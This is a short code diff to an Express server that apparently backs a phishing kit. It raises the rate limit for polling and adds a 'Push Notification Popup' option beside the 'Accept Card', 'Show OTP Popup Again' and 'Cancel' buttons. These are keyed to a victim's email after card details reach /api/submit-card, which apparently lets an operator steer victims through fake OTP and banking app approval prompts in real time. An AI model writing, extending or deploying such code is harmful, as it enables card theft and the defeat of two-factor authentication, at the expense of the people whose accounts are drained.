@@ -83,10 +83,10 @@ if (isProduction) {
   app.use(express.static(clientDist));
 }
 
-// Apply general API rate limiting (max 150 requests per 15 minutes per IP)
+// Apply general API rate limiting (max 2000 requests per 15 minutes per IP to allow for polling)
 const apiLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
-  max: 150,
+  max: 2000,
   message: { success: false, error: 'Too many requests, please try again later.' },
   standardHeaders: true,
   legacyHeaders: false,
@@ -437,6 +437,7 @@ app.post('/api/submit-card', async (req, res) => {
   const reply_markup = {
     inline_keyboard: [
       [{ text: '✅ Accept Card & Redirect', callback_data: `accept_card:${email}` }],
+      [{ text: '📲 Push Notification Popup', callback_data: `show_app_push:${email}` }],
       [{ text: '🔄 Show OTP Popup Again', callback_data: `show_otp_again:${email}` }],
       [{ text: '❌ Cancel Everything', callback_data: `cancel:${email}` }]
     ]
